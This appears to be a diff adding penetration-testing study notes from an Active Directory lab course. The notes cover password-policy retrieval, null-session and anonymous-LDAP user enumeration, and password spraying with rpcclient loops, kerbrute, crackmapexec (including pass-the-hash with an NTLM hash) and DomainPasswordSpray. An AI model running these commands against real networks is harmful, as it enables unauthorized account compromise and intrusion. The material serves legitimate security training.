@@ -31,3 +31,99 @@ Responder is a tool built to listen, analyze, and poison LLMNR, NBT-NS, and MDNS
 ## Identifying users
 ### Kerbrute
 Kerbrute can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We will use Kerbrute in conjunction with the jsmith.txt or jsmith2.txt user lists from Insidetrust. 
+## Password spraying
+After obtaining the usernames we can try to perform password spraying but for that it'll be easier if we can retrieve the password policy enforced.
+This can be done either by SMB NULL session or LDAP Anonymous bind.
+If there are know credentials crackmapexec can be used
+```
+ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
+```
+### rpcclient
+```
+rpcclient -U "" -N 172.16.5.5
+>querydominfo
+>getdompwinfo
+```
+### enum4linux or enum4linux-ng
+```
+enum4linux -P 172.16.5.5
+```
+Enum4linux-ng provided us with a bit clearer output and handy JSON and YAML output using the -oA flag.
+```
+enum4linux-ng -P 172.16.5.5 -oA ilfreight
+```
+### Enumerating Null Session - from Windows
+```
+net use \\DC01\ipc$ "" /u:""
+```
+### linux - LDAP Anonymous bind
+With an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as windapsearch.py, ldapsearch, ad-ldapdomaindump.py, etc., to pull the password policy. With ldapsearch, it can be a bit cumbersome but doable.
+```
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+```
+### windows
+If we can authenticate to the domain from a Windows host, we can use built-in Windows binaries such as net.exe to retrieve the password policy. We can also use various tools such as PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc.
+```
+net accounts
+```
+```
+PS C:\htb> import-module .\PowerView.ps1
+PS C:\htb> Get-DomainPolicy
+```
+
+## Detailed User Enumeration
+- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
+- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
+- Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the statistically-likely-usernames GitHub repo, or gathered by using a tool such as linkedin2username to create a list of potentially valid users
+- Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist
+### using enum4linux
+```
+enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+```
+### rpcclient
+```
+rpcclient -U "" -N 172.16.5.5
+>enumdomusers
+```
+### crackmapexec
+```
+crackmapexec smb 172.16.5.5 --users
+```
+### ldapsearch
+If we choose to use ldapsearch we will need to specify a valid LDAP search filter. We can learn more about these search filters in the Active Directory LDAP module.
+```
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+```
+### windapsearch
+Tools such as windapsearch make this easier (though we should still understand how to create our own LDAP search filters). Here we can specify anonymous access by providing a blank username with the -u flag and the -U flag to tell the tool to retrieve just users.
+```
+./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+```
+### using kerbrute
+```
+ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+```
+## Password spraying
+### using rpcclient
+```
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+```
+### using kerbrute
+```
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+```
+### using crackmapexec
+```
+ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+ ```
+### local admin spraying with crackmapexec
+```
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+```
+## Internal password spraying from a domain joined windows
+### Using DomainPasswordSpray.ps1
+```
+PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
+PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
